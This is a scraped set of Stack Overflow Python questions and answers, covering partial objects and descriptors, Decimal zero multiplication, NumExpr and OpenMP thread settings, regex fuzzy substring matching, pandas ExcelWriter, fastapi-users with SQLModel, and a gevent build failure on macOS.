<pre class=""lang-py prettyprint-override""><code>from functools import partial

def func1():
    print(&quot;foo&quot;)

func1_partial = partial(func1)

class A:
    f = func1
    g = func1_partial

a = A()


a.f() # TypeError: func1() takes 0 positional arguments but 1 was given

a.g() # prints &quot;foo&quot;

</code></pre>
<p>I kind of expected them both to behave in the same way.</p>
","74307329","<p>The trick that allows functions to become bound methods is the <a href=""https://docs.python.org/3/howto/descriptor.html"" rel=""noreferrer""><code>__get__</code> magic method</a>.</p>
<p>To <em>very</em> briefly summarize that page, when you access a field on an instance, say <code>foo.bar</code>, Python first checks whether <code>bar</code> exists in <code>foo</code>'s <code>__dict__</code> (or <code>__slots__</code>, if it has one). If it does, we return it, no harm done. If not, then we look on <code>type(foo)</code>. <em>However,</em> when we access the field <code>Foo.bar</code> on the <em>class</em> <code>Foo</code> through an instance, something magical happens. When we write <code>foo.bar</code>, assuming there is no <code>bar</code> on <code>foo</code>'s <code>__dict__</code> (resp. <code>__slots__</code>), then we actually call <code>Foo.bar.__get__(foo, Foo)</code>. That is, Python calls a magic method asking the object how it would like to be retrieved.</p>
<p>This is how <a href=""https://docs.python.org/3/library/functions.html#property"" rel=""noreferrer"">properties</a> are implemented, and it's also how bound methods are implemented. Somewhere deep down (probably written in C), there's a <code>__get__</code> function on the <em>type</em> <code>function</code> that binds the method when accessed through an instance.</p>
<p><code>functools.partial</code>, despite looking a lot like a function, is not an instance of the type <code>function</code>. It's just a random class that happens to implement <code>__call__</code>, and it doesn't implement <code>__get__</code>. Why doesn't it? Well, they probably just didn't think it was worth it, or it's possible nobody even considered it. Regardless, the &quot;bound method&quot; trick applies to the type called <code>function</code>, not to all callable objects.</p>
<hr />
<p>Another useful resource on magic methods, and <code>__get__</code> in particular: <a href=""https://rszalski.github.io/magicmethods/#descriptor"" rel=""noreferrer"">https://rszalski.github.io/magicmethods/#descriptor</a></p>
"
"74467875","1","VS Code: ""The isort server crashed 5 times in the last 3 minutes...""","<p>I may have messed up some environmental path variables.</p>
<p>I was tinkering around VS Code while learning about Django and virtual environments, and changing the directory path of my Python install. While figuring out how to point VS Code's default Python path, I deleted some User path variables.</p>
<p>Then, isort began to refuse to run.</p>
<p>I've tried uninstalling the extension(s), deleting the ms-python.'s, and uninstalling VS Code itself, clearing the Python Workspace Interpreter Settings, and restarting my computer.</p>
<p>Even if it's not my path variables, anyone know the defaults that should be in the &quot;user&quot; paths variables?</p>
","74488407","<p>I ended up refreshing my Windows install. Was for the best because I'm repurposing an older machine anyway.</p>
"
"74500614","1","Python Decimal - multiplication by zero","<p>Why does the following code:</p>
<pre><code>from decimal import Decimal
result = Decimal('0') * Decimal('0.8881783462119193534061639577')
print(result)
</code></pre>
<p>return <strong>0E-28</strong> ?</p>
<p>I've traced it to the following code in the <a href=""https://github.com/python/cpython/edit/main/Lib/_pydecimal.py"" rel=""noreferrer"">module</a>:</p>
<pre><code>if not self or not other:
    ans = _dec_from_triple(resultsign, '0', resultexp)
    # Fixing in case the exponent is out of bounds
    ans = ans._fix(context)
    return ans
</code></pre>
<p>The code appears to follow <a href=""https://speleotrove.com/decimal/daops.html#refmult"" rel=""noreferrer"">Decimal Arithmetic Specification</a>, which doesn't explicitly suggest what to do when we multiply by zero, referring to 'special numbers' from <a href=""https://ieeexplore.ieee.org/document/27840"" rel=""noreferrer"">another standard</a>, which also doesn't specify what we do when we multiply an integer by zero  :)
So the <strong>decimal</strong> library does the thing that <em><strong>is</strong></em> explicitly specified:</p>
<ul>
<li>The coefficient of the result, before rounding, is computed by multiplying together the coefficients of the operands.</li>
<li>The exponent of the result, before rounding, is the sum of the exponents of the two operands.</li>
<li>The sign of the result is the exclusive or of the signs of the operands.</li>
</ul>
<p><strong>Question:</strong> what is the need to return the coefficient and exponent (i.e, 0E-28) if one of the operands is a zero? We already know what that coefficient is when calling the multiplication function. Why not just return zero?</p>
","74515870","<p><a href=""https://github.com/rhettinger"" rel=""nofollow noreferrer"">Raymond Hettinger</a> has given a comprehensive explanation at <a href=""https://github.com/python/cpython/pull/99604"" rel=""nofollow noreferrer"">cpython github</a>:</p>
<p>In <a href=""https://speleotrove.com/decimal/daops.html"" rel=""nofollow noreferrer"">Arithmetic Operations</a>, the section on Arithmetic operations rules tells us:</p>
<blockquote>
<p>Trailing zeros are not removed after operations.</p>
</blockquote>
<p>There are test cases covering multiplication by zero. Here are some from multiply.decTest:</p>
<pre><code>-- zeros, etc.
mulx021 multiply  0      0     -&gt;  0
mulx022 multiply  0     -0     -&gt; -0
mulx023 multiply -0      0     -&gt; -0
mulx024 multiply -0     -0     -&gt;  0
mulx025 multiply -0.0   -0.0   -&gt;  0.00
mulx026 multiply -0.0   -0.0   -&gt;  0.00
mulx027 multiply -0.0   -0.0   -&gt;  0.00
mulx028 multiply -0.0   -0.0   -&gt;  0.00
mulx030 multiply  5.00   1E-3  -&gt;  0.00500
mulx031 multiply  00.00  0.000 -&gt;  0.00000
mulx032 multiply  00.00  0E-3  -&gt;  0.00000     -- rhs is 0
mulx033 multiply  0E-3   00.00 -&gt;  0.00000     -- lhs is 0
mulx034 multiply -5.00   1E-3  -&gt; -0.00500
mulx035 multiply -00.00  0.000 -&gt; -0.00000
mulx036 multiply -00.00  0E-3  -&gt; -0.00000     -- rhs is 0
mulx037 multiply -0E-3   00.00 -&gt; -0.00000     -- lhs is 0
mulx038 multiply  5.00  -1E-3  -&gt; -0.00500
mulx039 multiply  00.00 -0.000 -&gt; -0.00000
mulx040 multiply  00.00 -0E-3  -&gt; -0.00000     -- rhs is 0
mulx041 multiply  0E-3  -00.00 -&gt; -0.00000     -- lhs is 0
mulx042 multiply -5.00  -1E-3  -&gt;  0.00500
mulx043 multiply -00.00 -0.000 -&gt;  0.00000
mulx044 multiply -00.00 -0E-3  -&gt;  0.00000     -- rhs is 0
mulx045 multiply -0E-3  -00.00 -&gt;  0.00000     -- lhs is 0
</code></pre>
<p>And this from the examples:</p>
<pre><code>mulx053 multiply 0.9 -0 -&gt; -0.0
</code></pre>
<p>In the Summary of Arithmetic section, the motivation is explained at a high level:</p>
<blockquote>
<p>The arithmetic was designed as a decimal extended floating-point arithmetic, directly implementing the rules that people are taught at
school. Up to a given working precision, exact unrounded results are
given when possible (for instance, 0.9 ÷ 10 gives 0.09, not
0.089999996), and trailing zeros are correctly preserved in most operations (1.23 + 1.27 gives 2.50, not 2.5). Where results would
exceed the working precision, floating-point rules apply.</p>
</blockquote>
<p>More detail in given in the FAQ section <a href=""https://speleotrove.com/decimal/decifaq1.html#tzeros"" rel=""nofollow noreferrer"">Why are trailing fractional zeros important?</a>.</p>
"
"71248521","1","Why "" NumExpr defaulting to 8 threads. "" warning message shown in python?","<p>I am trying to use the lux library in python to get visualization recommendations. It shows warnings like <strong>NumExpr defaulting to 8 threads.</strong>.</p>
<pre><code>import pandas as pd
import numpy as np
import opendatasets as od
pip install lux-api
import lux
import matplotlib
</code></pre>
<p>And then:</p>
<pre><code>link = &quot;https://www.kaggle.com/noordeen/insurance-premium-prediction&quot;
od.download(link) 
df = pd.read_csv(&quot;./insurance-premium-prediction/insurance.csv&quot;)
</code></pre>
<p>But, everything is working fine. Is there any problem or should I ignore it?
Warning shows like this:
<a href=""https://i.stack.imgur.com/UAKDS.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/UAKDS.png"" alt=""enter image description here"" /></a></p>
","74656206","<p>This is not really something to worry about in most cases. The warning comes from <a href=""https://github.com/pydata/numexpr/blob/b68de57bfed90684b3ea79060c3a7953b9629429/numexpr/utils.py#L119-L164"" rel=""nofollow noreferrer"">this function</a>, here the most important part:</p>
<pre class=""lang-py prettyprint-override""><code>...
    env_configured = False
    n_cores = detect_number_of_cores()
    if 'NUMEXPR_MAX_THREADS' in os.environ:
        # The user has configured NumExpr in the expected way, so suppress logs.
        env_configured = True
        n_cores = MAX_THREADS
...
    if 'NUMEXPR_NUM_THREADS' in os.environ:
        requested_threads = int(os.environ['NUMEXPR_NUM_THREADS'])
    elif 'OMP_NUM_THREADS' in os.environ:
        requested_threads = int(os.environ['OMP_NUM_THREADS'])
    else:
        requested_threads = n_cores
        if not env_configured:
            log.info('NumExpr defaulting to %d threads.'%n_cores)
</code></pre>
<p>So if neither <code>NUMEXPR_MAX_THREADS</code> nor <code>NUMEXPR_NUM_THREADS</code> nor <code>OMP_NUM_THREADS</code> are set, NumExpr uses so many threads as there are cores (even if <a href=""https://numexpr.readthedocs.io/projects/NumExpr3/en/latest/user_guide.html#threadpool-configuration"" rel=""nofollow noreferrer"">the documentation says</a> &quot;at most 8&quot;, yet this is not what I see <a href=""https://github.com/pydata/numexpr/blob/b68de57bfed90684b3ea79060c3a7953b9629429/numexpr/utils.py#L167-L187"" rel=""nofollow noreferrer"">in the code</a>).</p>
<p>You might want to use another number of threads, e.g. while really huge matrices are calculated and one could profit from it or to use less threads, because there is no improvement. Set the environment variables either in the shell or prior to importing numexpr, e.g.</p>
<pre class=""lang-py prettyprint-override""><code>import os
os.environ['NUMEXPR_MAX_THREADS'] = '4'
os.environ['NUMEXPR_NUM_THREADS'] = '2'
import numexpr as ne 
</code></pre>
"
"74717007","1","Why does a python function work in parallel even if it should not?","<p>I am running this code using the <em>healpy</em> package. I am not using multiprocessing and I need it to run on a single core. It worked for a certain amount of time, but, when I run it now, the function <code>healpy.projector.GnomonicProj.projmap</code> takes all the available cores.</p>
<p>This is the incriminated code block:</p>
<pre><code>def Stacking () :

    f = lambda x,y,z: pixelfunc.vec2pix(xsize,x,y,z,nest=False)
    map_array = pixelfunc.ma_to_array(data)
    im = np.zeros((xsize, xsize))
    plt.figure()

    for i in range (nvoids) :
        sys.stdout.write(&quot;\r&quot; + str(i+1) + &quot;/&quot; + str(nvoids))
        sys.stdout.flush()
        proj = hp.projector.GnomonicProj(rot=[rav[i],decv[i]], xsize=xsize, reso=2*nRad*rad_deg[i]*60/(xsize))
        im += proj.projmap(map_array, f)

    im/=nvoids
    plt.imshow(im)
    plt.colorbar()
    plt.title(title + &quot; (Map)&quot;)
    plt.savefig(&quot;../Plots/stackedMap_&quot;+name+&quot;.png&quot;)

    return im
</code></pre>
<p>Does someone know why this function is running in parallel? And most important, does someone know a way to run it in a single core?</p>
<p>Thank you!</p>
","74717228","<p><a href=""https://github.com/healpy/healpy/issues/558"" rel=""nofollow noreferrer"">In this thread</a> they recommend to set the environment variable <code>OMP_NUM_THREADS</code> accordingly:</p>
<blockquote>
<p>Worked with:</p>
<pre><code>import os
os.environ['OMP_NUM_THREADS'] = '1'
import healpy as hp
import numpy as np
</code></pre>
<p><code>os.environ['OMP_NUM_THREADS'] = '1'</code> have to be done before import numpy and healpy libraries.</p>
</blockquote>
<p>As to the why: probably they use some parallelization techniques wrapped within their implementation of the functions you use. According to the name of the variable, I would guess <a href=""https://en.wikipedia.org/wiki/OpenMP"" rel=""nofollow noreferrer"">OpenMP</a> it is.</p>
"
"74717893","1","How to efficiently search for similar substring in a large text python?","<p>Let me try to explain my issue with an example, I have a large corpus and a substring like below,</p>
<pre><code>corpus = &quot;&quot;&quot;very quick service, polite workers(cory, i think that's his name), i basically just drove there and got a quote(which seems to be very fair priced), then dropped off my car 4 days later(because they were fully booked until then), then i dropped off my car on my appointment day, then the same day the shop called me and notified me that the the job is done i can go pickup my car. when i go checked out my car i was amazed by the job they've done to it, and they even gave that dirty car a wash( prob even waxed it or coated it, cuz it was shiny as hell), tires shine, mats were vacuumed too. i gave them a dirty, broken car, they gave me back a what seems like a brand new car. i'm happy with the result, and i will def have all my car's work done by this place from now.&quot;&quot;&quot;

substring = &quot;&quot;&quot;until then then i dropped off my car on my appointment day then the same day the shop called me and notified me that the the job is done i can go pickup my car when i go checked out my car i was amazed by the job they ve done to it and they even gave that dirty car a wash prob even waxed it or coated it cuz it was shiny as hell tires shine mats were vacuumed too i gave them a dirty broken car they gave me back a what seems like a brand new car i m happy with the result and i will def have all my car s work done by this place from now&quot;&quot;&quot;
</code></pre>
<p>Both the substring and corpus are very similar but it not exact,</p>
<p>If I do something like,</p>
<pre><code>import re
re.search(substring, corpus, flags=re.I) # this will fail substring is not exact but rather very similar
</code></pre>
<p>In the corpus the substring is like below which is bit different from the substring I have because of that regular expression search is failing, can someone suggest a really good alternative for similar substring lookup,</p>
<pre><code>until then), then i dropped off my car on my appointment day, then the same day the shop called me and notified me that the the job is done i can go pickup my car. when i go checked out my car i was amazed by the job they've done to it, and they even gave that dirty car a wash( prob even waxed it or coated it, cuz it was shiny as hell), tires shine, mats were vacuumed too. i gave them a dirty, broken car, they gave me back a what seems like a brand new car. i'm happy with the result, and i will def have all my car's work done by this place from now
</code></pre>
<p>I did try difflib library but it was not satisfying my use-case.</p>
<p>Some background information,</p>
<p>The substring I have right now, is obtained some time ago from pre-processed corpus using this regex <code>re.sub(&quot;[^a-zA-Z]&quot;, &quot; &quot;, corpus)</code>.</p>
<p>But now I need to use that substring I have to do the reverse lookup in the corpus text and find the start and ending index in the corpus.</p>
","74719826","<p>You don't actually need to fuzzy match all that much, at least for the example given; text can only change in spaces within <code>substring</code>, and it can only change by adding at least one non-alphabetic character (which can replace a space, but the space can't be deleted without a replacement). This means you can construct a regex directly  from substring with wildcards between words, <code>search</code> (or <code>finditer</code>) the <code>corpus</code> for it, and the resulting match object will tell you where the match(es) begin and end:</p>
<pre><code>import re

# Allow any character between whitespace-separated &quot;words&quot; except ASCII
# alphabetic characters
ssre = re.compile(r'[^a-z]+'.join(substring.split()), re.IGNORECASE)

if m := ssre.search(corpus):
    print(m.start(), m.end())

    print(repr(m.group(0)))
</code></pre>
<p><a href=""https://tio.run/##vVXBatwwEL37K4btYb10YwrtoQRyCCGUXFpojqWFsTy7VlaWVElex/n57ZO9TVJISJtDF9aspZk3b948af2YWmfff/ThoFzwfaQzWiwWewkj/ey12lGUsNdK1uSd0UlocGEnIZYIH9ekKbXa7vDktIzU6kiWO1nlnZqjVmzMSDd9TNQEtxcEShBi29DWJWIUcUnKodWqRSnpIiVHtdDEYMM6kA8o3wARqTajeC8Nuc2GupEUB/pADY@RDCcJZS2K@zjVGWnItTZ9plA7t0Nab5M2E9JvQP0UpLP5F3vvtE2d2JRLHBPwoIge89L80jpPuVFgdHNv1iW90fN7lmaKy98bVxM0apwVVFZsIQN56Nz7Y@2KhpkWNlQrKrN2ffrNTNPAkbjjO6zX4z1o7ncJfSdkSKjTemIy6SB7IG55fyTT6JBmNM5obQmNATFFDXwLYJ3IBVIOkjYTlOrv8mKuHTFwaINhizFZRR1kXoVJOk5xln3Pqu87pCfnqtzOXF46FJ0IrKkOmInNRNYzzykGktUM44FbJjubwugdlEXGpK4Ms1J62VGLKWHSOrWTFuDSm2Pv0EobQ41sEAVkjOgoI6yafTyrNamIoXjDCnYJrsP8hgrHoChiX8cUtN3O5@LBPv9qnv/inddbh/6wzl875yXjPOubx655xjRPeeaRZV7jGEA@Y5gX/EIv@wXuOOjOu5AAWRRv6NwYNwAXAC0HVridcLGlQcA/eqSeRPHYyEotgN7EBcmtEp/o/Pri6grlfcvI0OoBIRYxQqcz1KiU67w2Uobltx98cvf97bK6geXKe89W0ePKLlc4pAi/@vT5y9fLi/Pry1VRaLiVTs8oo1VROKi2nP8AVqcF4YNb16ayq2LiAAic7EpsA6zi0XYQHxCzDa735bvVanU4/AI"" rel=""nofollow noreferrer"" title=""Python 3.8 (pre-release) – Try It Online"">Try it online!</a></p>
<p>which correctly identifies where the match began (index 217) and ended (index 771) in <code>corpus</code>; <code>.group(0)</code> can directly extract the matching text for you if you prefer (it's uncommon to need the indices, so there's a decent chance you were asking for them solely to extract the real text, and <code>.group(0)</code> does that directly). The output is:</p>
<pre class=""lang-none prettyprint-override""><code>217 771
&quot;until then), then i dropped off my car on my appointment day, then the same day the shop called me and notified me that the the job is done i can go pickup my car. when i go checked out my car i was amazed by the job they've done to it, and they even gave that dirty car a wash( prob even waxed it or coated it, cuz it was shiny as hell), tires shine, mats were vacuumed too. i gave them a dirty, broken car, they gave me back a what seems like a brand new car. i'm happy with the result, and i will def have all my car's work done by this place from now&quot;
</code></pre>
<p>If spaces might be deleted without being replaced, just change the <code>+</code> quantifier to <code>*</code> (the regex will run a little slower since it can't short-circuit as easily, but would still work, and should run fast enough).</p>
<p>If you need to handle non-ASCII alphabetic characters, the regex joiner can change from <code>r'[^a-z]+'</code> to the equivalent <code>r'[\W\d_]+'</code> (which means &quot;match all non-word characters [non-alphanumeric and not underscore], plus numeric characters and underscores&quot;); it's a little more awkward to read, but it handles stuff like <code>é</code> properly (treating it as part of a word, not a connector character).</p>
<p>While it's not going to be as flexible as <code>difflib</code>, when you know no words are removed or added, it's just a matter of spacing and punctuation, this works perfectly, and should run significantly faster than a true fuzzy matching solution (that has to do far more work to handle the concept of close matches).</p>
"
"74948525","1","FutureWarning: save is not part of the public API in Python","<p>I am using Python to convert Pandas df to .xlsx (in Plotly-Dash app.). All working well so far but with this warning tho:</p>
<p><strong>&quot;FutureWarning:
save is not part of the public API, usage can give unexpected results and will be removed in a future version&quot;</strong></p>
<p>How should I modify the code below in order to keep its functionality and stability in future? Thanks!</p>
<pre><code> writer = pd.ExcelWriter(&quot;File.xlsx&quot;, engine = &quot;xlsxwriter&quot;)

 workbook  = writer.book

 df.to_excel(writer, sheet_name = 'Sheet', index = False)
  
 writer.save()
</code></pre>
","74948596","<p>just replace save with close.</p>
<pre><code> writer = pd.ExcelWriter(&quot;File.xlsx&quot;, engine = &quot;xlsxwriter&quot;)

 workbook  = writer.book

 df.to_excel(writer, sheet_name = 'Sheet', index = False)
  
 writer.close()
</code></pre>
"
"70694787","1","fastapi fastapi-users with Database adapter for SQLModel users table is not created","<p>I was trying to use <a href=""https://github.com/fastapi-users/fastapi-users"" rel=""noreferrer"">fastapi users</a> package to quickly Add a registration and authentication system to my FastAPI project which uses the PostgreSQL database. I am using <code>asyncio</code> to be able to create asynchronous functions.</p>
<p>In the beginning, I used only sqlAlchemy and I have tried their example <a href=""https://fastapi-users.github.io/fastapi-users/configuration/full-example/"" rel=""noreferrer"">here</a>. And I added those line of codes to my app/app.py to create the database at the starting of the server. and everything worked like a charm. the table users was created on my database.</p>
<pre class=""lang-py prettyprint-override""><code>@app.on_event(&quot;startup&quot;)
async def on_startup():
    await create_db_and_tables()
</code></pre>
<p>Since I am using SQLModel I added <a href=""https://github.com/fastapi-users/fastapi-users-db-sqlmodel"" rel=""noreferrer"">FastAPI Users - Database adapter for SQLModel</a> to my virtual en packages. And I added those lines to <code>fastapi_users/db/__init__.py</code> to be able to use the SQL model database.</p>
<pre class=""lang-py prettyprint-override""><code>try:
    from fastapi_users_db_sqlmodel import (  # noqa: F401
        SQLModelBaseOAuthAccount,
        SQLModelBaseUserDB,
        SQLModelUserDatabase,
    )
except ImportError:  # pragma: no cover
    pass
</code></pre>
<p>I have also modified <code>app/users.py</code>, to use <code>SQLModelUserDatabase</code> instead of sqlAchemy one.</p>
<pre class=""lang-py prettyprint-override""><code>async def get_user_manager(user_db: SQLModelUserDatabase = Depends(get_user_db)):
    yield UserManager(user_db)
</code></pre>
<p>and the <code>app/dp.py</code> to use <code>SQLModelUserDatabase</code>, <code>SQLModelBaseUserDB</code>, here is the full code of <code>app/db.py</code></p>
<pre class=""lang-py prettyprint-override""><code>import os
from typing import AsyncGenerator

from fastapi import Depends
from sqlalchemy.ext.asyncio import AsyncSession, create_async_engine
from sqlalchemy.orm import sessionmaker

from fastapi_users.db import SQLModelUserDatabase, SQLModelBaseUserDB
from sqlmodel import SQLModel


from app.models import UserDB

DATABASE_URL = os.environ.get(&quot;DATABASE_URL&quot;)


engine = create_async_engine(DATABASE_URL)

async_session_maker = sessionmaker(
    engine, class_=AsyncSession, expire_on_commit=False)


async def create_db_and_tables():
    async with engine.begin() as conn:
        await conn.run_sync(SQLModel.metadata.create_all)


async def get_async_session() -&gt; AsyncSession:
    async_session = sessionmaker(
        engine, class_=AsyncSession, expire_on_commit=False
    )
    async with async_session() as session:
        yield session


async def get_user_db(session: AsyncSession = Depends(get_async_session)):
    yield SQLModelUserDatabase(UserDB, session, SQLModelBaseUserDB)

</code></pre>
<p>Once I run the code, the table is not created at all. I wonder what could be the issue. I could not understand. Any idea?</p>
","75063693","<p>By the time I posted this question that was the answer I received from one of the maintainer of <code>fastapi-users</code> that made me switch to <code>sqlAlchemy</code> that time, actually I do not know if they officially released sqlModel DB adapter or not</p>
<blockquote>
<p>My guess is that you didn't change the <code>UserDB</code> model so that it inherits from the <code>SQLModelBaseUserDB</code> one. It's necessary in order to let <code>SQLModel</code> detect all your models and create them.</p>
</blockquote>
<blockquote>
<p>You can have an idea of what it should look like in <code>fastapi-users-db-sqlmodel</code> tests: <a href=""https://github.com/fastapi-users/fastapi-users-db-sqlmodel/blob/3a46b80399f129aa07a834a1b40bf49d08c37be1/tests/conftest.py#L25-L27"" rel=""nofollow noreferrer"">https://github.com/fastapi-users/fastapi-users-db-sqlmodel/blob/3a46b80399f129aa07a834a1b40bf49d08c37be1/tests/conftest.py#L25-L27</a></p>
</blockquote>
<blockquote>
<blockquote>
<p>Bear in mind though that we didn't <strong>officially release</strong> this DB adapter; as they are some problems with <code>SQLModel</code> regarding <code>UUID</code> (tiangolo/sqlmodel#25). So you'll probably run into issues.</p>
</blockquote>
</blockquote>
<p>and here is the GitHub link of the issue: <a href=""https://github.com/fastapi-users/fastapi-users/discussions/861"" rel=""nofollow noreferrer"">https://github.com/fastapi-users/fastapi-users/discussions/861</a></p>
"
"73894238","1","gevent 21.12.0 installation failing in mac os monterey","<p>I am trying to install gevent 21.12.0 on Mac OS Monterey (version 12.6) with python 3.9.6 and pip 21.3.1. But it is failing with the below error. Any suggestion?</p>
<pre><code>(venv) debrajmanna@debrajmanna-DX6QR261G3 qa % pip install gevent
Collecting gevent
  Using cached gevent-21.12.0.tar.gz (6.2 MB)
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Collecting greenlet&lt;2.0,&gt;=1.1.0
  Using cached greenlet-1.1.3-cp39-cp39-macosx_10_9_universal2.whl
Collecting zope.event
  Using cached zope.event-4.5.0-py2.py3-none-any.whl (6.8 kB)
Collecting zope.interface
  Using cached zope.interface-5.4.0-cp39-cp39-macosx_10_9_universal2.whl
Requirement already satisfied: setuptools in /Users/debrajmanna/code/python/github/spotnana/venv/lib/python3.9/site-packages (from gevent) (60.2.0)
Building wheels for collected packages: gevent
  Building wheel for gevent (pyproject.toml) ... error
  ERROR: Command errored out with exit status 1:
   command: /Users/debrajmanna/code/python/github/spotnana/venv/bin/python /Users/debrajmanna/code/python/github/spotnana/venv/lib/python3.9/site-packages/pip/_vendor/pep517/in_process/_in_process.py build_wheel /var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/tmpi2i_lqc2
       cwd: /private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370
  Complete output (46 lines):
  running bdist_wheel
  running build
  running build_py
  running build_ext
  generating cffi module 'build/temp.macosx-10.9-universal2-cpython-39/gevent.libuv._corecffi.c'
  Running '(cd  &quot;/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps/libev&quot;  &amp;&amp; sh ./configure -C &gt; configure-output.txt )' in /private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370
  generating cffi module 'build/temp.macosx-10.9-universal2-cpython-39/gevent.libev._corecffi.c'
  Not configuring libev, 'config.h' already exists
  Not configuring libev, 'config.h' already exists
  building 'gevent.libev.corecext' extension
  Embedding c-ares &lt;cffi.setuptools_ext._add_c_module.&lt;locals&gt;.build_ext_make_mod object at 0x104f40bb0&gt; &lt;_setuputils.Extension('gevent.resolver.cares') at 0x1048f4640&gt;
  Inserted  build/temp.macosx-10.9-universal2-cpython-39/c-ares/include in include dirs ['build/temp.macosx-10.9-universal2-cpython-39/c-ares/include', '/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/include/python3.9', '/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps', '/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps/c-ares/include', '/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps/c-ares/src/lib', 'src/gevent', 'src/gevent/libev', 'src/gevent/resolver', '.']
  Running '(cd  &quot;/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps/c-ares&quot;  &amp;&amp; if [ -r include/ares_build.h ]; then cp include/ares_build.h include/ares_build.h.orig; fi   &amp;&amp; sh ./configure --disable-dependency-tracking -C CFLAGS=&quot;-Wno-unused-result -Wsign-compare -Wunreachable-code -fno-common -dynamic -DNDEBUG -g -fwrapv -O3 -Wall -iwithsysroot/System/Library/Frameworks/System.framework/PrivateHeaders -iwithsysroot/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Headers -arch arm64 -arch x86_64 -Werror=implicit-function-declaration&quot;  &amp;&amp; cp src/lib/ares_config.h include/ares_build.h &quot;$OLDPWD&quot;   &amp;&amp; cat include/ares_build.h   &amp;&amp; if [ -r include/ares_build.h.orig ]; then mv include/ares_build.h.orig include/ares_build.h; fi) &gt; configure-output.txt' in /private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/build/temp.macosx-10.9-universal2-cpython-39/c-ares/include
  configure: WARNING: Continuing even with errors mentioned immediately above this line.
  rm: conftest.dSYM: is a directory
  rm: conftest.dSYM: is a directory
  configure: WARNING: Continuing even with errors mentioned immediately above this line.
  building 'gevent.resolver.cares' extension
  building 'gevent._gevent_c_greenlet_primitives' extension
  building 'gevent._gevent_c_hub_primitives' extension
  building 'gevent._gevent_c_hub_local' extension
  building 'gevent._gevent_c_waiter' extension
  building 'gevent._gevent_cgreenlet' extension
  building 'gevent._gevent_c_tracer' extension
  building 'gevent._gevent_c_abstract_linkable' extension
  building 'gevent._gevent_c_semaphore' extension
  building 'gevent._gevent_clocal' extension
  building 'gevent._gevent_c_ident' extension
  building 'gevent._gevent_c_imap' extension
  building 'gevent._gevent_cevent' extension
  building 'gevent._gevent_cqueue' extension
  src/gevent/queue.c:7071:12: warning: unused function '__pyx_pw_6gevent_14_gevent_cqueue_5Queue_25__nonzero__' [-Wunused-function]
  static int __pyx_pw_6gevent_14_gevent_cqueue_5Queue_25__nonzero__(PyObject *__pyx_v_self) {
             ^
  1 warning generated.
  src/gevent/queue.c:7071:12: warning: unused function '__pyx_pw_6gevent_14_gevent_cqueue_5Queue_25__nonzero__' [-Wunused-function]
  static int __pyx_pw_6gevent_14_gevent_cqueue_5Queue_25__nonzero__(PyObject *__pyx_v_self) {
             ^
  1 warning generated.
  building 'gevent.libev._corecffi' extension
  building 'gevent.libuv._corecffi' extension
  build/temp.macosx-10.9-universal2-cpython-39/gevent.libuv._corecffi.c:50:14: fatal error: 'pyconfig.h' file not found
  #    include &lt;pyconfig.h&gt;
               ^~~~~~~~~~~~
  1 error generated.
  error: command '/usr/bin/clang' failed with exit code 1
  ----------------------------------------
  ERROR: Failed building wheel for gevent
Failed to build gevent
ERROR: Could not build wheels for gevent, which is required to install pyproject.toml-based projects
</code></pre>
","75240247","<p>Looked all over trying to figure out a solution to this problem until I finally stumbled on <a href=""https://stackoverflow.com/questions/24391964/how-can-i-get-python-h-into-my-python-virtualenv-on-mac-osx"">this post</a>.</p>
<p>I think the issue is specific to the virtual environment. I had the project open with it's own venv in PyCharm, and it seems that the python distribution headers were not findable.</p>
<p>To reiterate the solution linked:</p>
<ol>
<li>Find where the Python.h file is defined. I was able to find it using <code>find /usr/local -name Python.h</code></li>
<li>Copy the path to the directory <code>Python.h</code> is defined in</li>
<li>Set the <code>C_INCLUDE_PATH</code> environment variable accordingly, for me: <code>export C_INCLUDE_PATH=&quot;/usr/local/munki/Python.framework/Versions/3.9/include/python3.9&quot;</code></li>
</ol>
<p>After this, I was able to run <code>pip3 install gevent</code> with no issues.</p>
"